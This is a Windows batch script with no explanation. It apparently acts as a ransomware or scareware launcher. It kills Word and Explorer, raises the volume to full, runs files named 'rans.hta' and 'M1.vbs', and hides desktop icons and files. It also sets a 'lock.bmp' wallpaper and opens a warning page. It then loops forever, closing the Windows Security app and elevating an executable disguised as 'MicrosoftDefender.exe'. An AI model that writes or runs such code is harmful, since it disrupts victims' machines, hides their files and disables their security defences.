Taskkill/f /im winword.exe
set "scriptPath=%~dp0"
Cd /d %scriptPath%
nircmd.exe mutesysvolume 0
nircmd.exe setsysvolume 65535

Taskkill/f /im explorer.exe
Nircmd beep 300 6000
Start rans.hta
Start M1.vbs
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{645FF040-5081-101B-9F08-00AA002F954E}" /t REG_DWORD /d 1 /f
Attrib +s +h +r +o /s /l /d %userprofile%\desktop\*
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%scriptPath%lock.bmp" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll
RUNDLL32.EXE user32.dll
RUNDLL32.EXE user32.dll
Timeout /t 10
Taskkill/f /im wscript.exe & taskkill/f /im mshta.exe
Start explorer.exe & timeout /t 10
Start Warning.hta
:loop
@echo off
tasklist | findstr /i "SecHealthUI.exe" >nul
if %errorlevel%==0 (
    taskkill /f /im SecHealthUI.exe
    echo SecHealthUI.exe a été fermé.
    nircmd elevate MicrosoftDefender.exe
)
goto loop
Exit

